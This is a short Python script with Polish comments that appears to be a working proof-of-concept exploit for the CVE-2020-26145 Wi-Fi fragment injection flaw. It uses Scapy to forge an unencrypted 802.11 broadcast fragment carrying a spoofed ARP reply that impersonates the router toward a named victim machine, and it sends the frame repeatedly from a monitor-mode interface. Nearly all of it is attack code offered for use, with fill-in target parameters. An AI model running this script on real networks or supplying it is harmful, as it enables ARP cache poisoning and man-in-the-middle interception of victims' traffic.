#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Plain-Text Broadcast Fragment Injection (CVE-2020-26145)
autor: <Twoje imię>
"""
from scapy.all import RadioTap, Dot11, LLC, SNAP, ARP, sendp

# === PARAMETRY ŚRODOWISKA – UZUPEŁNIJ ===
AP        = "B8:D4:BC:8D:07:8C"      # BSSID routera
VICT      = "66:92:C3:C5:32:7F"      # MAC Windows
brama_ip  = "192.168.1.1"            # IP gateway
victim_ip = "192.168.1.101"          # IP ofiary
iface     = "wlan1mon"               # interfejs monitor

# === KONSTRUKCJA RAMKI ===
# • broadcast (addr1 = ff:ff:ff:ff:ff:ff)
# • fragment number = 1  (drugi fragment)
# • brak bitu Protected -> plaintext
dot11 = Dot11(
    type=2, subtype=0,
    addr1="ff:ff:ff:ff:ff:ff",
    addr2=AP,
    addr3=AP,
    FCfield="to-DS"
)
dot11.SC = (0 << 4) | 1   # seq = 0, frag = 1

# ładunek: fałszywa odpowiedź ARP (brama -> ofiara)
payload = LLC()/SNAP()/ARP(
    op=2,                     # reply
    psrc=brama_ip,
    pdst=victim_ip,
    hwsrc=AP,                 # podszywamy się pod router
    hwdst=VICT
)

frame = RadioTap()/dot11/payload

print("[*] Wysyłam fragment broadcast w plaintext…")
sendp(frame, iface=iface, count=20, inter=0.05, verbose=False)
print("[+] Gotowe – sprawdź tablicę ARP na maszynie ofiary.")
